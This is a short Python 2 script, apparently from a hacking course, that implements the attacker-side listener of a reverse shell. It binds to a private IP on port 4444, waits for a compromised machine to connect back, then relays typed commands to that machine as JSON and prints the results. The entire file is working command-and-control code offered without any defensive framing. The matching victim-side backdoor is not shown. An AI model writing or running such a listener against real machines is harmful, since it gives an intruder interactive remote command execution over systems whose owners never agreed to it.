import socket
import json
import subprocess

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)

        print("[+] waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from" + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        
        if command[0] == 'exit':
            self.connection.close()
            exit()

        return self.reliable_receive()

    def run(self):
        while True:
            command = raw_input(">>")
            command = command.split(' ')
            command_result = self.execute_remotely(command) 
            print(command_result)

my_listener = Listener("192.168.198.128",4444)
my_listener.run()